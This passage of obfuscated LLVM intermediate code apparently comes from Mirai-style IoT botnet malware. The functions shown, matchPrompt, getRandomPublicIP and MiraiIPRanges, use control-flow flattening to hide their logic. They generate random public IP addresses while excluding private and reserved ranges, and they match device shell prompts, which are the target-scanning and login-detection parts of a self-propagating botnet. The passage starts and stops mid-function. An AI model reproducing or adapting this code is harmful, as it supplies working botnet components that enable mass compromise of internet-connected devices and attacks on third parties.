  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #5
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1198247426, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.472, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 550714290, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 550714290, label %11
    i32 -839208306, label %18
    i32 -2033769247, label %19
    i32 -699967573, label %24
    i32 986452874, label %37
    i32 -1360379527, label %50
    i32 1391193911, label %63
    i32 372239879, label %75
    i32 2054106881, label %76
    i32 -1291837581, label %78
    i32 -910208288, label %81
    i32 984517420, label %100
    i32 1877992666, label %101
    i32 773033179, label %102
    i32 -435397124, label %105
    i32 1700320593, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -839208306, i32 -435397124
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -2033769247, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -699967573, i32 2054106881
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 372239879, i32 986452874
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 372239879, i32 -1360379527
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 372239879, i32 1391193911
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 372239879, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 2054106881, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -1291837581, i32 -910208288
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -2033769247, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 984517420, i32 1877992666
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1700320593, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 773033179, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 550714290, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1700320593, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 598488483, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 598488483, label %14
    i32 -1002635958, label %19
    i32 984789679, label %24
    i32 -130456491, label %29
    i32 303558750, label %34
    i32 -1515442864, label %39
    i32 612957359, label %44
    i32 1144316691, label %49
    i32 1885490733, label %54
    i32 -1062281981, label %59
    i32 -1087626361, label %64
    i32 345270641, label %69
    i32 -2048198598, label %74
    i32 954289443, label %79
    i32 1597369625, label %84
    i32 1725078062, label %89
    i32 1671346683, label %94
    i32 -38653104, label %99
    i32 1107080392, label %104
    i32 -341670296, label %109
    i32 1601151190, label %114
    i32 -1794351634, label %119
    i32 -750441523, label %124
    i32 -738401356, label %129
    i32 1605264106, label %134
    i32 153001757, label %139
    i32 -673340806, label %144
    i32 1948681343, label %149
    i32 -1460543324, label %154
    i32 -520253439, label %158
    i32 -1046775150, label %160
    i32 1523732749, label %173
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  %18 = select i1 %17, i32 -520253439, i32 -1002635958
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 10
  %23 = select i1 %22, i32 -520253439, i32 984789679
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 100
  %28 = select i1 %27, i32 -130456491, i32 -1515442864
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp sge i32 %31, 64
  %33 = select i1 %32, i32 303558750, i32 -1515442864
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp sle i32 %36, 127
  %38 = select i1 %37, i32 -520253439, i32 -1515442864
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 127
  %43 = select i1 %42, i32 -520253439, i32 612957359
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 169
  %48 = select i1 %47, i32 1144316691, i32 1885490733
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 254
  %53 = select i1 %52, i32 -520253439, i32 1885490733
  store i32 %53, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 172
  %58 = select i1 %57, i32 -1062281981, i32 345270641
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp sle i32 %61, 16
  %63 = select i1 %62, i32 -1087626361, i32 345270641
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sle i32 %66, 31
  %68 = select i1 %67, i32 -520253439, i32 345270641
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 192
  %73 = select i1 %72, i32 -2048198598, i32 1597369625
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 0
  %78 = select i1 %77, i32 954289443, i32 1597369625
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 2
  %83 = select i1 %82, i32 -520253439, i32 1597369625
  store i32 %83, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 192
  %88 = select i1 %87, i32 1725078062, i32 -38653104
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 88
  %93 = select i1 %92, i32 1671346683, i32 -38653104
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 99
  %98 = select i1 %97, i32 -520253439, i32 -38653104
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 192
  %103 = select i1 %102, i32 1107080392, i32 -341670296
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 168
  %108 = select i1 %107, i32 -520253439, i32 -341670296
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 198
  %113 = select i1 %112, i32 1601151190, i32 -750441523
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 18
  %118 = select i1 %117, i32 -520253439, i32 -1794351634
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 19
  %123 = select i1 %122, i32 -520253439, i32 -750441523
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 198
  %128 = select i1 %127, i32 -738401356, i32 153001757
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  %133 = select i1 %132, i32 1605264106, i32 153001757
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  %138 = select i1 %137, i32 -520253439, i32 153001757
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 203
  %143 = select i1 %142, i32 -673340806, i32 -1460543324
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 1948681343, i32 -1460543324
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 113
  %153 = select i1 %152, i32 -520253439, i32 -1460543324
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp sge i32 %156, 224
  store i32 -520253439, i32* %switchVar
  store i1 %157, i1* %.reg2mem
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %159 = select i1 %.reload, i32 -1046775150, i32 1523732749
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 223
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %167 = call i32 @rand() #5
  %168 = srem i32 %167, 255
  %169 = trunc i32 %168 to i8
  store i8 %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %170 = call i32 @rand() #5
  %171 = srem i32 %170, 255
  %172 = trunc i32 %171 to i8
  store i8 %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  store i32 598488483, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 16, i32 16, i1 false)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %177 = zext i8 %176 to i32
  %178 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %179 = zext i8 %178 to i32
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %181 = zext i8 %180 to i32
  %182 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %183 = zext i8 %182 to i32
  %184 = call i32 (i8*, i8*, ...) @szprintf(i8* %175, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %177, i32 %179, i32 %181, i32 %183)
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %186 = call i32 @inet_addr(i8* %185) #5
  ret i32 %186

loopEnd:                                          ; preds = %160, %158, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 1811017608, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1811017608, label %14
    i32 2062095874, label %19
    i32 -913162203, label %24
    i32 170842069, label %29
    i32 -718882641, label %34
    i32 -1571465099, label %39
    i32 -1308053068, label %44
    i32 -98025112, label %49
    i32 1030712554, label %54
    i32 -1976551432, label %59
    i32 -1156237145, label %64
    i32 1412042060, label %69
    i32 -1158903532, label %74
    i32 -1054665292, label %79
    i32 432949723, label %84
    i32 -2132908362, label %89
    i32 856741893, label %94
    i32 -288802963, label %99
    i32 229001636, label %104
    i32 9668823, label %109
    i32 -977772064, label %114
    i32 1623052291, label %119
    i32 -1750181803, label %124
    i32 -988574542, label %129
    i32 435131103, label %134
    i32 -1412739323, label %139
    i32 -1100252599, label %144
    i32 1120793661, label %149
    i32 -537081665, label %154
    i32 1959757981, label %159
    i32 -550182426, label %164
    i32 1689220816, label %169
    i32 2124528067, label %174
    i32 672927328, label %179
    i32 -1375156790, label %183
    i32 1638489415, label %184
    i32 561548015, label %186
    i32 -828496409, label %199
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 1638489415, i32 2062095874
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 1638489415, i32 -913162203
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 1638489415, i32 170842069
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 1638489415, i32 -718882641
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 16
  %38 = select i1 %37, i32 1638489415, i32 -1571465099
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 56
  %43 = select i1 %42, i32 1638489415, i32 -1308053068
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  %48 = select i1 %47, i32 1638489415, i32 -98025112
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 192
  %53 = select i1 %52, i32 1030712554, i32 -1976551432
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 168
  %58 = select i1 %57, i32 1638489415, i32 -1976551432
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 172
  %63 = select i1 %62, i32 -1156237145, i32 -1158903532
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sge i32 %66, 16
  %68 = select i1 %67, i32 1412042060, i32 -1158903532
  store i32 %68, i32* %switchVar
